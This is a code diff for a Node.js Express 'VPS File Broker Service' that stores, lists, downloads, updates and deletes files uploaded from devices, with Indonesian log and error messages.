+              if (entry.startsWith(`${activeDeviceId}-`)) {
+                const rootFolderName = entry.substring(`${activeDeviceId}-`.length);
+                if (rootFolderName) foundFolders.add(rootFolderName);
               }
             }
           }
+          const standardFolders = ["DCIM", "Pictures", "Download", "Documents", "WhatsApp", "Movies", "Music"];
+          for (const std of standardFolders) {
+            foundFolders.add(std);
+          }
+          for (const folderName of Array.from(foundFolders).sort()) {
+            const fullDirPath = path2.join(uploadDir, `${activeDeviceId}-${folderName}`);
+            let mtime = /* @__PURE__ */ new Date();
+            if (fs.existsSync(fullDirPath)) {
+              mtime = fs.statSync(fullDirPath).mtime;
+            }
+            list.push({
+              name: folderName,
+              isDirectory: true,
+              isFile: false,
+              date: null,
+              folder: "Root",
+              deviceId: activeDeviceId,
+              size: 0,
+              mtime,
+              path: folderName,
+              relativePath: folderName
+            });
+          }
+          return res.json(list);
         }
-        list.sort((a, b) => new Date(b.mtime) - new Date(a.mtime));
+        if (folderParam === "all") {
+          const allDirs = fs.readdirSync(uploadDir);
+          for (const d of allDirs) {
+            let scanDeepFiles2 = function(curDir, subRelPath) {
+              const items2 = fs.readdirSync(curDir);
+              for (const item of items2) {
+                if (item === "all.json" || item.startsWith(".")) continue;
+                const itemPath = path2.join(curDir, item);
+                const stat = fs.statSync(itemPath);
+                if (stat.isDirectory()) {
+                  scanDeepFiles2(itemPath, subRelPath ? `${subRelPath}/${item}` : item);
+                } else if (stat.isFile()) {
+                  list.push({
+                    name: item,
+                    isDirectory: false,
+                    isFile: true,
+                    date: /^\d{4}-\d{2}-\d{2}$/.test(subRelPath) ? subRelPath : null,
+                    folder: baseFolder,
+                    deviceId: activeDeviceId,
+                    size: stat.size,
+                    mtime: stat.mtime,
+                    relativePath: subRelPath ? `${subRelPath}/${item}` : item
+                  });
+                }
+              }
+            };
+            var scanDeepFiles = scanDeepFiles2;
+            if (!d.startsWith(`${activeDeviceId}-`)) continue;
+            const fullDirPath = path2.join(uploadDir, d);
+            if (!fs.statSync(fullDirPath).isDirectory()) continue;
+            const baseFolder = d.substring(`${activeDeviceId}-`.length);
+            scanDeepFiles2(fullDirPath, "");
+          }
+          list.sort((a, b) => new Date(b.mtime) - new Date(a.mtime));
+          return res.json(list);
+        }
+        const normFolder = folderParam.replace(/^[/\\]+/, "").replace(/[/\\]+$/, "");
+        const parts = normFolder.split(/[/\\]+/).filter(Boolean);
+        const rootPart = `${activeDeviceId}-${parts[0]}`;
+        const remainingParts = parts.slice(1);
+        const targetDir = path2.resolve(uploadDir, rootPart, ...remainingParts);
+        if (!targetDir.startsWith(path2.resolve(uploadDir))) {
+          return res.status(403).json({ error: "Akses tidak diperbolehkan." });
+        }
+        if (!fs.existsSync(targetDir)) {
+          return res.json([]);
+        }
+        const items = fs.readdirSync(targetDir);
+        for (const item of items) {
+          if (item === "all.json" || item.startsWith(".")) continue;
+          const itemPath = path2.join(targetDir, item);
+          const stat = fs.statSync(itemPath);
+          if (stat.isDirectory()) {
+            const isDateFolder = /^\d{4}-\d{2}-\d{2}$/.test(item) || item === "no-date";
+            if (isDateFolder) {
+              const subFiles = fs.readdirSync(itemPath);
+              for (const subFilename of subFiles) {
+                if (subFilename === "all.json" || subFilename.startsWith(".")) continue;
+                const subFilePath = path2.join(itemPath, subFilename);
+                const subStat = fs.statSync(subFilePath);
+                if (subStat.isFile()) {
+                  list.push({
+                    name: subFilename,
+                    isDirectory: false,
+                    isFile: true,
+                    date: item,
+                    folder: normFolder,
+                    deviceId: activeDeviceId,
+                    size: subStat.size,
+                    mtime: subStat.mtime,
+                    relativePath: `${item}/${subFilename}`
+                  });
+                }
+              }
+            } else {
+              list.push({
+                name: item,
+                isDirectory: true,
+                isFile: false,
+                date: null,
+                folder: normFolder,
+                deviceId: activeDeviceId,
+                size: 0,
+                mtime: stat.mtime,
+                path: `${normFolder}/${item}`,
+                relativePath: `${normFolder}/${item}`
+              });
+            }
+          } else if (stat.isFile()) {
+            list.push({
+              name: item,
+              isDirectory: false,
+              isFile: true,
+              date: null,
+              folder: normFolder,
+              deviceId: activeDeviceId,
+              size: stat.size,
+              mtime: stat.mtime,
+              relativePath: item
+            });
+          }
+        }
+        list.sort((a, b) => {
+          if (a.isDirectory && !b.isDirectory) return -1;
+          if (!a.isDirectory && b.isDirectory) return 1;
+          return new Date(b.mtime) - new Date(a.mtime);
+        });
         res.json(list);
       } catch (err) {
         res.status(500).json({ error: "Gagal membaca berkas di VPS.", details: err.message });
@@ -1801,8 +2185,8 @@ var require_fileController = __commonJS({
     function downloadVpsFile(req, res) {
       const folder = req.query.folder || "DCIM/Camera";
       const { deviceId, date, name } = req.query;
-      if (!date || !name) {
-        return res.status(400).json({ error: 'Parameter "date" dan "name" diperlukan.' });
+      if (!name) {
+        return res.status(400).json({ error: 'Parameter "name" diperlukan.' });
       }
       let activeDeviceId = deviceId;
       if (!activeDeviceId) {
@@ -1815,11 +2199,34 @@ var require_fileController = __commonJS({
         return res.status(400).json({ error: "Device ID tidak ditemukan." });
       }
       const uploadDir = process.env.UPLOAD_DIR || "./uploads";
-      const filePath = path.resolve(uploadDir, `${activeDeviceId}-${folder}`, date, name);
-      if (!filePath.startsWith(path.resolve(uploadDir))) {
-        return res.status(403).json({ error: "Akses tidak diperbolehkan." });
+      const normFolder = (folder || "").replace(/^[/\\]+/, "").replace(/[/\\]+$/, "");
+      const parts = normFolder.split(/[/\\]+/).filter(Boolean);
+      const rootPart = parts.length > 0 ? `${activeDeviceId}-${parts[0]}` : activeDeviceId;
+      const remainingParts = parts.slice(1);
+      const targetDir = path2.resolve(uploadDir, rootPart, ...remainingParts);
+      let filePath = null;
+      if (date && date !== "undefined" && date !== "null" && date !== "no-date") {
+        const candidate = path2.resolve(targetDir, date, name);
+        if (fs.existsSync(candidate)) filePath = candidate;
       }
-      if (!fs.existsSync(filePath)) {
+      if (!filePath) {
+        const candidate = path2.resolve(targetDir, name);
+        if (fs.existsSync(candidate)) filePath = candidate;
+      }
+      if (!filePath && fs.existsSync(targetDir)) {
+        try {
+          const subItems = fs.readdirSync(targetDir);
+          for (const sub of subItems) {
+            const candidate = path2.resolve(targetDir, sub, name);
+            if (fs.existsSync(candidate) && fs.statSync(candidate).isFile()) {
+              filePath = candidate;
+              break;
+            }
+          }
+        } catch (_) {
+        }
+      }
+      if (!filePath || !filePath.startsWith(path2.resolve(uploadDir)) || !fs.existsSync(filePath)) {
         return res.status(404).json({ error: "Berkas tidak ditemukan di VPS." });
       }
       const inline = req.query.inline === "true";
@@ -1827,32 +2234,60 @@ var require_fileController = __commonJS({
         res.setHeader("Content-Disposition", `attachment; filename="${encodeURIComponent(name)}"`);
       } else {
         res.setHeader("Content-Disposition", "inline");
+        const ext = path2.extname(name).toLowerCase();
+        if ([".jpg", ".jpeg"].includes(ext)) res.setHeader("Content-Type", "image/jpeg");
+        else if (ext === ".png") res.setHeader("Content-Type", "image/png");
+        else if (ext === ".webp") res.setHeader("Content-Type", "image/webp");
+        else if (ext === ".gif") res.setHeader("Content-Type", "image/gif");
       }
       res.sendFile(filePath);
     }
     async function deleteVpsFile(req, res) {
       const folder = req.query.folder || "DCIM/Camera";
       const { deviceId, date, name } = req.query;
-      if (!date || !name) {
-        return res.status(400).json({ error: 'Parameter "date" dan "name" diperlukan.' });
+      if (!name) {
+        return res.status(400).json({ error: 'Parameter "name" diperlukan.' });
       }
       let activeDeviceId = deviceId;
       if (!activeDeviceId) {
         return res.status(400).json({ error: "Device ID diperlukan." });
       }
       const uploadDir = process.env.UPLOAD_DIR || "./uploads";
-      const filePath = path.resolve(uploadDir, `${activeDeviceId}-${folder}`, date, name);
-      if (!filePath.startsWith(path.resolve(uploadDir))) {
-        return res.status(403).json({ error: "Akses tidak diperbolehkan." });
+      const normFolder = (folder || "").replace(/^[/\\]+/, "").replace(/[/\\]+$/, "");
+      const parts = normFolder.split(/[/\\]+/).filter(Boolean);
+      const rootPart = parts.length > 0 ? `${activeDeviceId}-${parts[0]}` : activeDeviceId;
+      const remainingParts = parts.slice(1);
+      const targetDir = path2.resolve(uploadDir, rootPart, ...remainingParts);
+      let filePath = null;
+      if (date && date !== "undefined" && date !== "null" && date !== "no-date") {
+        const candidate = path2.resolve(targetDir, date, name);
+        if (fs.existsSync(candidate)) filePath = candidate;
       }
-      if (!fs.existsSync(filePath)) {
+      if (!filePath) {
+        const candidate = path2.resolve(targetDir, name);
+        if (fs.existsSync(candidate)) filePath = candidate;
+      }
+      if (!filePath && fs.existsSync(targetDir)) {
+        try {
+          const subItems = fs.readdirSync(targetDir);
+          for (const sub of subItems) {
+            const candidate = path2.resolve(targetDir, sub, name);
+            if (fs.existsSync(candidate) && fs.statSync(candidate).isFile()) {
+              filePath = candidate;
+              break;
+            }
+          }
+        } catch (_) {
+        }
+      }
+      if (!filePath || !filePath.startsWith(path2.resolve(uploadDir)) || !fs.existsSync(filePath)) {
         return res.status(404).json({ error: "Berkas tidak ditemukan di VPS." });
       }
       try {
         fs.unlinkSync(filePath);
         console.log(`\u{1F5D1}\uFE0F Berkas dihapus dari VPS disk: ${filePath}`);
-        const dirPath = path.dirname(filePath);
-        if (fs.readdirSync(dirPath).length === 0) {
+        const dirPath = path2.dirname(filePath);
+        if (fs.existsSync(dirPath) && fs.readdirSync(dirPath).length === 0) {
           fs.rmdirSync(dirPath);
           console.log(`\u{1F5D1}\uFE0F Folder kosong dihapus dari VPS: ${dirPath}`);
         }
@@ -1899,7 +2334,7 @@ var require_fileRoutes = __commonJS({
 var require_upload = __commonJS({
   "middlewares/upload.js"(exports2, module2) {
     var multer = require("multer");
-    var path = require("path");
+    var path2 = require("path");
     var fs = require("fs");
     var pendingDownloads = require_pendingDownloads();
     var streamStorage = {
@@ -1971,17 +2406,30 @@ var require_upload = __commonJS({
     var upload = multer({ storage: streamStorage });
     var diskStorage = multer.diskStorage({
       destination: (req, file, cb) => {
-        const uploadDir = process.env.UPLOAD_DIR || "./uploads";
-        if (!fs.existsSync(uploadDir)) {
-          fs.mkdirSync(uploadDir, { recursive: true });
+        const directUploadDir2 = process.env.DIRECT_UPLOAD_DIR || "./upload-file";
+        if (!fs.existsSync(directUploadDir2)) {
+          fs.mkdirSync(directUploadDir2, { recursive: true });
         }
-        cb(null, uploadDir);
+        cb(null, directUploadDir2);
       },
       filename: (req, file, cb) => {
-        cb(null, Date.now() + "-" + file.originalname);
+        const ext = path2.extname(file.originalname).toLowerCase();
+        const sanitizedBase = path2.basename(file.originalname, ext).replace(/[^a-zA-Z0-9_-]/g, "_").slice(0, 50);
+        const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
+        cb(null, `${sanitizedBase}-${uniqueSuffix}${ext}`);
       }
     });
-    var uploadToDisk = multer({ storage: diskStorage });
+    var fileFilter = (req, file, cb) => {
+      cb(null, true);
+    };
+    var uploadToDisk = multer({
+      storage: diskStorage,
+      limits: {
+        fileSize: 200 * 1024 * 1024
+        // Max 200MB
+      },
+      fileFilter
+    });
     module2.exports = {
       upload,
       uploadToDisk
@@ -1995,6 +2443,7 @@ var require_uploadController = __commonJS({
     var fs = require("fs");
     var pendingDownloads = require_pendingDownloads();
     var { upload } = require_upload();
+    var db2 = require_db();
     function handleUploadStream(req, res) {
       const contentType = req.headers["content-type"] || "";
       if (contentType.includes("multipart/form-data")) {
@@ -2075,25 +2524,123 @@ var require_uploadController = __commonJS({
         }
       }
     }
-    function handleDirectUpload(req, res) {
+    async function handleDirectUpload(req, res) {
       if (!req.file) {
         return res.status(400).json({ error: "Tidak ada file yang diunggah" });
       }
-      console.log(`\u{1F4E5} File sukses disimpan di VPS: ${req.file.path}`);
+      const host = req.get("x-forwarded-host") || req.get("host");
+      const protocol = req.headers["x-forwarded-proto"] || req.protocol;
+      const downloadUrl = `${protocol}://${host}/upload-file/${req.file.filename}`;
+      console.log(`\u{1F4E5} File sukses disimpan di VPS (folder upload-file): ${req.file.path}`);
+      const fileData = {
+        originalName: req.file.originalname,
+        filename: req.file.filename,
+        size: req.file.size,
+        mimeType: req.file.mimetype,
+        path: req.file.path,
+        downloadUrl
+      };
+      const savedRecord = await db2.saveUploadedFile(fileData);
       res.json({
         status: "success",
         message: "File berhasil diunggah ke VPS",
-        file: {
-          originalName: req.file.originalname,
-          filename: req.file.filename,
-          size: req.file.size,
-          path: req.file.path
-        }
+        file: savedRecord || fileData
       });
+    }
+    async function getUploadedFilesList(req, res) {
+      try {
+        const files = await db2.getUploadedFiles();
+        const reqProtocol = req.headers["x-forwarded-proto"] || req.protocol;
+        const formattedFiles = files.map((file) => {
+          let downloadUrl = file.downloadUrl;
+          if (downloadUrl && (reqProtocol === "https" || req.secure)) {
+            if (downloadUrl.startsWith("http://")) {
+              downloadUrl = downloadUrl.replace(/^http:\/\//, "https://");
+            }
+          }
+          return { ...file, downloadUrl };
+        });
+        res.json({
+          status: "success",
+          data: formattedFiles
+        });
+      } catch (err) {
+        console.error("\u274C Gagal mengambil daftar uploaded files:", err.message);
+        res.status(500).json({ error: "Gagal mengambil daftar file terunggah" });
+      }
+    }
+    async function handleUpdateFile(req, res) {
+      try {
+        const { id } = req.params;
+        if (!req.file) {
+          return res.status(400).json({ error: "Tidak ada file baru yang diunggah untuk penggantian" });
+        }
+        const existing = await db2.findUploadedFileById(id);
+        if (!existing) {
+          if (req.file.path && fs.existsSync(req.file.path)) {
+            fs.unlinkSync(req.file.path);
+          }
+          return res.status(404).json({ error: "File tidak ditemukan di database" });
+        }
+        if (fs.existsSync(existing.path)) {
+          fs.copyFileSync(req.file.path, existing.path);
+          fs.unlinkSync(req.file.path);
+        } else {
+          fs.renameSync(req.file.path, existing.path);
+        }
+        const updatePayload = {
+          originalName: req.file.originalname,
+          size: req.file.size,
+          mimeType: req.file.mimetype,
+          path: existing.path,
+          downloadUrl: existing.downloadUrl
+        };
+        const updatedRecord = await db2.updateUploadedFile(existing.id || id, updatePayload);
+        console.log(`\u{1F504} File ID ${id} (${existing.filename}) berhasil diperbarui dengan isi file baru.`);
+        res.json({
+          status: "success",
+          message: "File berhasil diperbarui (URL download tetap sama)",
+          file: updatedRecord || { ...existing, ...updatePayload }
+        });
+      } catch (err) {
+        console.error("\u274C Error saat update file:", err.message);
+        if (req.file && req.file.path && fs.existsSync(req.file.path)) {
+          fs.unlinkSync(req.file.path);
+        }
+        res.status(500).json({ error: "Gagal memperbarui file" });
+      }
+    }
+    async function handleDeleteFile(req, res) {
+      try {
+        const { id } = req.params;
+        const existing = await db2.findUploadedFileById(id);
+        if (!existing) {
+          return res.status(404).json({ error: "File tidak ditemukan" });
+        }
+        if (existing.path && fs.existsSync(existing.path)) {
+          try {
+            fs.unlinkSync(existing.path);
+            console.log(`\u{1F5D1}\uFE0F  File fisik terhapus dari VPS: ${existing.path}`);
+          } catch (e) {
+            console.warn(`\u26A0\uFE0F  Gagal menghapus file fisik ${existing.path}:`, e.message);
+          }
+        }
+        await db2.deleteUploadedFile(existing.id || id);
+        res.json({
+          status: "success",
+          message: "File berhasil dihapus"
+        });
+      } catch (err) {
+        console.error("\u274C Error saat menghapus file:", err.message);
+        res.status(500).json({ error: "Gagal menghapus file" });
+      }
     }
     module2.exports = {
       handleUploadStream,
-      handleDirectUpload
+      handleDirectUpload,
+      getUploadedFilesList,
+      handleUpdateFile,
+      handleDeleteFile
     };
   }
 });
@@ -2107,7 +2654,10 @@ var require_uploadRoutes = __commonJS({
     var { authenticateApiKey } = require_auth();
     var { uploadToDisk } = require_upload();
     router.post("/upload-stream/:downloadSessionId", uploadController.handleUploadStream);
+    router.get("/upload/files", uploadController.getUploadedFilesList);
     router.post("/upload", authenticateApiKey, uploadToDisk.single("file"), uploadController.handleDirectUpload);
+    router.put("/upload/files/:id", authenticateApiKey, uploadToDisk.single("file"), uploadController.handleUpdateFile);
+    router.delete("/upload/files/:id", authenticateApiKey, uploadController.handleDeleteFile);
     module2.exports = router;
   }
 });
@@ -2115,10 +2665,10 @@ var require_uploadRoutes = __commonJS({
 // controllers/monthlyController.js
 var require_monthlyController = __commonJS({
   "controllers/monthlyController.js"(exports2, module2) {
-    var path = require("path");
+    var path2 = require("path");
     var fs = require("fs");
     function getAvailableMonths(req, res) {
-      const dirPath = path.join(__dirname, "..", "json-management", "split-monthly-camera");
+      const dirPath = path2.join(__dirname, "..", "json-management", "split-monthly-camera");
       try {
         if (!fs.existsSync(dirPath)) {
           return res.json([]);
@@ -2136,7 +2686,7 @@ var require_monthlyController = __commonJS({
       if (!/^\d{4}-\d{2}$/.test(month)) {
         return res.status(400).json({ error: "Format bulan tidak valid. Harus format YYYY-MM" });
       }
-      const filePath = path.join(__dirname, "..", "json-management", "split-monthly-camera", `${month}.json`);
+      const filePath = path2.join(__dirname, "..", "json-management", "split-monthly-camera", `${month}.json`);
       try {
         if (!fs.existsSync(filePath)) {
           return res.status(404).json({ error: `Data untuk bulan ${month} tidak ditemukan` });
@@ -2176,6 +2726,88 @@ var require_monthlyRoutes = __commonJS({
   }
 });
 
+// routes/systemRoutes.js
+var require_systemRoutes = __commonJS({
+  "routes/systemRoutes.js"(exports2, module2) {
+    var express2 = require("express");
+    var router = express2.Router();
+    var os = require("os");
+    var fs = require("fs");
+    router.get("/metrics", (req, res) => {
+      try {
+        const totalMem = os.totalmem();
+        const freeMem = os.freemem();
+        const usedMem = totalMem - freeMem;
+        const memPercentage = totalMem > 0 ? parseFloat((usedMem / totalMem * 100).toFixed(1)) : 0;
+        const processMem = process.memoryUsage();
+        let diskInfo = null;
+        try {
+          if (typeof fs.statfsSync === "function") {
+            const stats = fs.statfsSync("/");
+            const bsize = stats.bsize || stats.frsize || 4096;
+            const totalDisk = stats.blocks * bsize;
+            const freeDisk = stats.bavail * bsize;
+            const usedDisk = totalDisk - freeDisk;
+            const diskPercentage = totalDisk > 0 ? parseFloat((usedDisk / totalDisk * 100).toFixed(1)) : 0;
+            diskInfo = {
+              total: totalDisk,
+              used: usedDisk,
+              free: freeDisk,
+              percentage: diskPercentage
+            };
+          }
+        } catch (diskErr) {
+          console.warn("Gagal mengambil statfs disk:", diskErr.message);
+        }
+        if (!diskInfo) {
+          diskInfo = {
+            total: 0,
+            used: 0,
+            free: 0,
+            percentage: 0,
+            unsupported: true
+          };
+        }
+        const cpus = os.cpus() || [];
+        const cpuCount = cpus.length;
+        const cpuModel = cpus.length > 0 ? cpus[0].model : "Unknown CPU";
+        const loadAvg = os.loadavg();
+        const systemMetrics = {
+          system: {
+            platform: os.platform(),
+            release: os.release(),
+            arch: os.arch(),
+            hostname: os.hostname(),
+            nodeVersion: process.version,
+            uptime: os.uptime(),
+            processUptime: process.uptime()
+          },
+          cpu: {
+            cores: cpuCount,
+            model: cpuModel,
+            loadavg: loadAvg.map((val) => parseFloat(val.toFixed(2)))
+          },
+          memory: {
+            total: totalMem,
+            used: usedMem,
+            free: freeMem,
+            percentage: memPercentage,
+            processRss: processMem.rss,
+            heapUsed: processMem.heapUsed,
+            heapTotal: processMem.heapTotal
+          },
+          disk: diskInfo
+        };
+        res.json(systemMetrics);
+      } catch (err) {
+        console.error("Error fetching system metrics:", err);
+        res.status(500).json({ error: "Gagal mengambil metrik sistem server" });
+      }
+    });
+    module2.exports = router;
+  }
+});
+
 // routes/index.js
 var require_routes = __commonJS({
   "routes/index.js"(exports2, module2) {
@@ -2186,7 +2818,9 @@ var require_routes = __commonJS({
     var fileRoutes = require_fileRoutes();
     var uploadRoutes = require_uploadRoutes();
     var monthlyRoutes = require_monthlyRoutes();
+    var systemRoutes = require_systemRoutes();
     router.use("/auth", authRoutes);
+    router.use("/system", systemRoutes);
     router.use("/", deviceRoutes);
     router.use("/", fileRoutes);
     router.use("/", uploadRoutes);
@@ -2200,34 +2834,59 @@ require("dotenv").config();
 var express = require("express");
 var http = require("http");
 var cors = require("cors");
+var path = require("path");
 var db = require_db();
 var socketModule = require_socket();
 var apiRoutes = require_routes();
 var rabbitmq = require_rabbitmq();
 var app = express();
+app.set("trust proxy", true);
 var server = http.createServer(app);
 var PORT = process.env.PORT || 3e3;
 app.use(cors({
   origin: "*",
   // Sesuaikan di production
   methods: ["GET", "POST", "PUT", "DELETE"],
-  allowedHeaders: ["Content-Type", "Authorization"]
+  allowedHeaders: ["Content-Type", "Authorization", "x-api-key"]
 }));
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+var legacyUploadDir = process.env.UPLOAD_DIR || "uploads";
+app.use("/uploads", express.static(path.resolve(legacyUploadDir)));
+var directUploadDir = process.env.DIRECT_UPLOAD_DIR || "upload-file";
+app.use("/upload-file", express.static(path.resolve(directUploadDir), {
+  setHeaders: (res, filePath) => {
+    const filename = path.basename(filePath);
+    res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
+  }
+}));
 app.use((req, res, next) => {
   console.log(`[${(/* @__PURE__ */ new Date()).toISOString()}] ${req.method} ${req.url}`);
   next();
 });
-app.get("/", (req, res) => {
+var healthCheckHandler = (req, res) => {
   res.json({
     status: "online",
     service: "VPS File Broker Service",
     dbConnected: db.isDbEnabled(),
     activeDevicesCount: socketModule.getActiveDevicesList().length
   });
-});
+};
+app.get("/", healthCheckHandler);
+app.get("/api/health", healthCheckHandler);
 app.use("/api", apiRoutes);
+app.use((err, req, res, next) => {
+  console.error(`\u{1F4A5} Express Error pada ${req.method} ${req.url}:`, err);
+  if (!res.headersSent) {
+    res.status(500).json({ error: "Internal Server Error", message: err.message, stack: process.env.NODE_ENV === "development" ? err.stack : void 0 });
+  }
+});
+process.on("uncaughtException", (err) => {
+  console.error("\u{1F4A5} Uncaught Exception:", err);
+});
+process.on("unhandledRejection", (reason) => {
+  console.error("\u{1F4A5} Unhandled Rejection:", reason);
+});
 async function startServer() {
   await db.initDb();
   await rabbitmq.initRabbitMQ();
